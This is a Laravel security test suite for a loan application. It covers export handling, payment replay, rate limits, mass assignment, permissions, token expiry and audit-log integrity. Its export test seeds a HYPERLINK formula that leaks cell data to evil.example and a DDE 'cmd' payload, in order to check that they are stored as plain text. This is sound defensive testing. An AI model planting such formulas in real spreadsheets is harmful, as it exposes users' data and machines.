<?php

namespace Tests\Feature\Security;

use App\Domain\Audit\AuditTrail;
use App\Domain\Loan\LoanService;
use App\Enums\Permission;
use App\Models\AuditLog;
use App\Models\CollateralItem;
use App\Models\Customer;
use App\Models\Loan;
use App\Models\Payment;
use App\Models\User;
use Illuminate\Database\QueryException;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Str;
use Laravel\Sanctum\Sanctum;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * Task 020 security review: tests for the issues found and fixed (formula injection in Excel exports,
 * cross-user idempotency-key replay, optional idempotency keys, missing rate limits, public storage
 * routes on the private disk, audit rows mutable through SQL, personal data in the export log, API tokens
 * that never expire) plus the critical paths: permission bypass on payment reversal, collateral release,
 * loan closure/cancellation, settings and exports, and mass assignment of financial fields.
 */
class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    private function userWith(Permission ...$permissions): User
    {
        $user = User::factory()->create();
        $user->givePermissionTo(array_map(fn (Permission $p) => $p->value, $permissions));

        return $user;
    }

    private function activeLoan(): Loan
    {
        Carbon::setTestNow('2026-10-01 09:00:00');
        $loan = Loan::factory()->create(['principal' => '10000.00', 'outstanding_principal' => '10000.00', 'interest_rate' => '2.0000', 'start_date' => '2026-10-01']);
        CollateralItem::factory()->for($loan)->create();
        $loan = app(LoanService::class)->activate($loan, User::factory()->create());
        Carbon::setTestNow('2026-10-20 10:00:00');

        return $loan;
    }

    private function payment(Loan $loan, array $overrides = []): array
    {
        return ['loan' => $loan->loan_no, 'type' => 'interest', 'amount' => '100', 'method' => 'cash', 'payment_date' => '2026-10-20', 'idempotency_key' => (string) Str::uuid(), ...$overrides];
    }

    // ── sensitive exports ───────────────────────────────────────────────────────────────────

    public function test_excel_exports_store_text_as_text_never_as_a_formula(): void
    {
        $payload = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
        Customer::factory()->create(['name' => $payload, 'address' => '+cmd|\'/C calc\'!A0']);

        $response = $this->actingAs($this->userWith(Permission::CustomersView, Permission::ReportsExport))
            ->get('/customers/export?format=xlsx')
            ->assertOk();

        $path = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($path, $response->streamedContent() ?: file_get_contents($response->getFile()->getPathname()));
        $sheet = IOFactory::load($path)->getActiveSheet();
        unlink($path);

        $found = null;
        foreach ($sheet->getRowIterator() as $row) {
            foreach ($row->getCellIterator() as $cell) {
                if ($cell->getValue() === $payload) {
                    $found = $cell;
                }
            }
        }

        $this->assertNotNull($found, 'The customer name should be in the workbook as literal text.');
        $this->assertSame(DataType::TYPE_STRING, $found->getDataType());
    }

    public function test_exports_are_audited_and_the_application_log_holds_no_personal_data(): void
    {
        $customer = Customer::factory()->create(['name' => 'Salma Begum', 'mobile' => '01711000000']);
        Log::spy();

        $this->actingAs($this->userWith(Permission::ReportsView, Permission::ReportsExport))
            ->get("/reports/customer-ledger/export?customer={$customer->customer_no}&format=pdf")
            ->assertOk();

        $log = AuditLog::query()->where('event', 'export.downloaded')->sole();
        $this->assertSame('report:customer-ledger', $log->new_values['export']);
        $this->assertStringContainsString('Salma Begum', json_encode($log->new_values['filters']));

        Log::shouldHaveReceived('info')->withArgs(fn (string $message, array $context) => $message === 'Export downloaded'
            && ! str_contains(json_encode($context), 'Salma') && ! str_contains(json_encode($context), '01711000000'));
    }

    public function test_exports_are_rate_limited(): void
    {
        $user = $this->userWith(Permission::CustomersView, Permission::ReportsExport);

        foreach (range(1, 20) as $i) {
            $this->actingAs($user)->get('/customers/export?format=xlsx')->assertOk();
        }

        $this->actingAs($user)->get('/customers/export?format=xlsx')->assertStatus(429);
    }

    // ── payment replay / duplicates ─────────────────────────────────────────────────────────

    public function test_payments_require_an_idempotency_key(): void
    {
        $loan = $this->activeLoan();
        Sanctum::actingAs($this->userWith(Permission::PaymentsCreate, Permission::LoansView));

        $this->postJson('/api/v1/payments', $this->payment($loan, ['idempotency_key' => null]))->assertJsonValidationErrors('idempotency_key');
        $this->postJson('/api/v1/payments', $this->payment($loan, ['idempotency_key' => 'short']))->assertJsonValidationErrors('idempotency_key');
        $this->assertSame(0, Payment::count());
    }

    public function test_another_users_idempotency_key_never_replays_their_payment(): void
    {
        $loan = $this->activeLoan();
        $alice = $this->userWith(Permission::PaymentsCreate, Permission::LoansView);
        $bob = $this->userWith(Permission::PaymentsCreate, Permission::LoansView);
        $data = $this->payment($loan, ['idempotency_key' => 'till-1-000042']);

        Sanctum::actingAs($alice);
        $receipt = $this->postJson('/api/v1/payments', $data)->assertCreated()->json('data.receipt_no');
        $this->postJson('/api/v1/payments', $data)->assertOk()->assertJsonPath('data.receipt_no', $receipt); // Alice's retry

        Sanctum::actingAs($bob);
        $this->postJson('/api/v1/payments', $data)->assertConflict()->assertJsonMissing(['receipt_no' => $receipt]);

        $this->assertSame(1, Payment::count());
        $this->assertSame($alice->id, Payment::sole()->created_by);
    }

    public function test_financial_actions_are_rate_limited(): void
    {
        $loan = $this->activeLoan();
        $user = $this->userWith(Permission::PaymentsCreate, Permission::LoansView);

        foreach (range(1, 30) as $i) {
            $this->actingAs($user)->post('/payments', $this->payment($loan, ['amount' => '0']))->assertSessionHasErrors('amount');
        }

        $this->actingAs($user)->post('/payments', $this->payment($loan))->assertStatus(429);
        $this->assertSame(0, Payment::count());
    }

    // ── mass assignment ─────────────────────────────────────────────────────────────────────

    public function test_financial_fields_cannot_be_mass_assigned(): void
    {
        $user = $this->userWith(Permission::LoansCreate, Permission::LoansView, Permission::PaymentsCreate, Permission::CollateralCreate);
        Sanctum::actingAs($user);
        $customer = Customer::factory()->create();

        $loanNo = $this->postJson('/api/v1/loans', [
            'customer' => $customer->customer_no, 'principal' => '50000', 'interest_rate' => '2', 'interest_rate_type' => 'monthly',
            'interest_period_unit' => 'month', 'start_date' => '2026-10-01',
            // Not accepted from the client:
            'status' => 'active', 'outstanding_principal' => '1', 'loan_no' => 'LN-HACK', 'customer_id' => 999, 'interest_base' => 'principal', 'closed_at' => now(),
        ])->assertCreated()->json('data.loan_no');

        $loan = Loan::where('loan_no', $loanNo)->sole();
        $this->assertNotSame('LN-HACK', $loanNo);
        $this->assertSame(['draft', '50000.00', $customer->id, 'outstanding', null], [$loan->status->value, $loan->outstanding_principal, $loan->customer_id, $loan->interest_base, $loan->closed_at]);

        $collateral = ['type' => 'gold', 'weight_grams' => '10', 'karat' => '22', 'estimated_value' => '90000'];
        $this->postJson("/api/v1/loans/{$loanNo}/collateral", [...$collateral, 'status' => 'released'])->assertJsonValidationErrors('status'); // refused outright
        $item = $this->postJson("/api/v1/loans/{$loanNo}/collateral", [
            ...$collateral, 'collateral_no' => 'COL-HACK', 'released_at' => now()->toDateTimeString(), 'released_by' => 1, 'loan_id' => 999,
        ])->assertCreated()->json('data.collateral_no');
        $this->assertNotSame('COL-HACK', $item);
        $stored = CollateralItem::where('collateral_no', $item)->sole();
        $this->assertSame(['held', null, null, $loan->id], [$stored->status->value, $stored->released_at, $stored->released_by, $stored->loan_id]);

        $active = $this->activeLoan();
        Sanctum::actingAs($user);
        $this->postJson('/api/v1/payments', $this->payment($active, [
            'receipt_no' => 'RCPT-HACK', 'status' => 'reversed', 'customer_id' => 999, 'created_by' => 999, 'reversed_at' => now(),
        ]))->assertCreated();

        $payment = Payment::sole();
        $this->assertNotSame('RCPT-HACK', $payment->receipt_no);
        $this->assertSame(['posted', $active->customer_id, $user->id, null], [$payment->status->value, $payment->customer_id, $payment->created_by, $payment->reversed_at]);
    }

    // ── permission bypass on the sensitive actions ──────────────────────────────────────────

    public function test_each_sensitive_action_needs_its_own_permission(): void
    {
        $loan = $this->activeLoan();
        $all = array_filter(Permission::cases(), fn (Permission $p) => ! in_array($p, [
            Permission::PaymentsReverse, Permission::CollateralRelease, Permission::LoansClose, Permission::LoansCancel,
            Permission::SettingsManage, Permission::ReportsExport, Permission::AuditView,
        ], true));
        $user = $this->userWith(...$all); // everything else, including the view/update permissions
        $payment = Payment::factory()->for($loan)->create();
        $item = $loan->collateralItems()->first();

        $this->actingAs($user)->post("/payments/{$payment->receipt_no}/reverse", ['reason' => 'Try'])->assertForbidden();
        $this->actingAs($user)->post("/collateral/{$item->collateral_no}/release", ['reason' => 'Try'])->assertForbidden();
        $this->actingAs($user)->post("/loans/{$loan->loan_no}/close")->assertForbidden();
        $this->actingAs($user)->post("/loans/{$loan->loan_no}/cancel", ['reason' => 'Try'])->assertForbidden();
        $this->actingAs($user)->put('/settings/loans', [])->assertForbidden();
        $this->actingAs($user)->get('/payments/export?format=xlsx')->assertForbidden();
        $this->actingAs($user)->get('/admin/audit-logs')->assertForbidden();

        Sanctum::actingAs($user);
        $this->postJson("/api/v1/payments/{$payment->receipt_no}/reverse", ['reason' => 'Try'])->assertForbidden();
        $this->postJson("/api/v1/collateral/{$item->collateral_no}/release", ['reason' => 'Try'])->assertForbidden();
        $this->postJson("/api/v1/loans/{$loan->loan_no}/close")->assertForbidden();
        $this->getJson('/api/v1/reports/due/export')->assertForbidden();

        $this->assertNull($payment->fresh()->reversed_at);
        $this->assertSame('held', $item->fresh()->status->value);
        $this->assertSame('active', $loan->fresh()->status->value);
    }

    public function test_internal_ids_and_unknown_numbers_are_not_resolvable(): void
    {
        $loan = $this->activeLoan();
        $user = $this->userWith(Permission::LoansView, Permission::PaymentsView, Permission::CustomersView);
        Sanctum::actingAs($user);

        $this->getJson("/api/v1/loans/{$loan->id}")->assertNotFound(); // numeric id is not a route key
        $this->getJson('/api/v1/loans/LN-999999-999999')->assertNotFound();
        $this->getJson('/api/v1/customers/1')->assertNotFound();
        $this->getJson("/api/v1/loans/{$loan->loan_no}")->assertOk()->assertJsonMissingPath('data.id')->assertJsonMissingPath('data.customer_id');
    }

    // ── authentication, sessions, tokens ────────────────────────────────────────────────────

    public function test_sign_in_and_password_endpoints_are_rate_limited_per_ip(): void
    {
        foreach (range(1, 20) as $i) {
            $this->post('/login', ['email' => "user{$i}@example.com", 'password' => 'wrong']); // many accounts, one IP
        }
        $this->post('/login', ['email' => 'another@example.com', 'password' => 'wrong'])->assertStatus(429);

        foreach (range(1, 6) as $i) {
            $this->post('/forgot-password', ['email' => "user{$i}@example.com"]);
        }
        $this->post('/forgot-password', ['email' => 'x@example.com'])->assertStatus(429);

        $user = User::factory()->create();
        foreach (range(1, 6) as $i) {
            $this->actingAs($user)->post('/confirm-password', ['password' => 'wrong']);
        }
        $this->actingAs($user)->post('/confirm-password', ['password' => 'password'])->assertStatus(429);
    }

    public function test_the_api_is_rate_limited_per_user(): void
    {
        Sanctum::actingAs(User::factory()->create()->fresh());

        foreach (range(1, 120) as $i) {
            $this->getJson('/api/v1/user')->assertOk();
        }
        $this->getJson('/api/v1/user')->assertStatus(429);
    }

    public function test_api_tokens_expire(): void
    {
        $this->assertNotNull(config('sanctum.expiration'));

        $user = User::factory()->create();
        $token = $this->postJson('/api/v1/auth/token', ['email' => $user->email, 'password' => 'password', 'device_name' => 'Till'])->json('token');

        $this->withToken($token)->getJson('/api/v1/user')->assertOk();

        $this->travel((int) config('sanctum.expiration') + 1)->minutes();
        $this->app['auth']->forgetGuards();
        $this->withToken($token)->getJson('/api/v1/user')->assertUnauthorized();
    }

    // ── file storage ────────────────────────────────────────────────────────────────────────

    public function test_private_files_have_no_public_storage_routes(): void
    {
        $this->assertFalse(Route::has('storage.local'));
        $this->assertFalse(Route::has('storage.local.upload'));
        $this->actingAs($this->admin())->get('/storage/customers/photo.jpg')->assertNotFound();
    }

    // ── audit integrity ─────────────────────────────────────────────────────────────────────

    public function test_audit_rows_cannot_be_changed_or_deleted_even_with_raw_sql(): void
    {
        $this->actingAs($this->admin());
        app(AuditTrail::class)->record('test.event', null, [], ['a' => 1]);

        foreach ([
            fn () => DB::table('audit_logs')->update(['event' => 'tampered']),
            fn () => DB::table('audit_logs')->delete(),
        ] as $attempt) {
            try {
                DB::transaction($attempt);
                $this->fail('The audit log must be append-only.');
            } catch (QueryException $e) {
                $this->assertStringContainsString('append-only', $e->getMessage());
            }
        }

        $this->assertSame(['test.event'], AuditLog::query()->pluck('event')->all());
    }
}
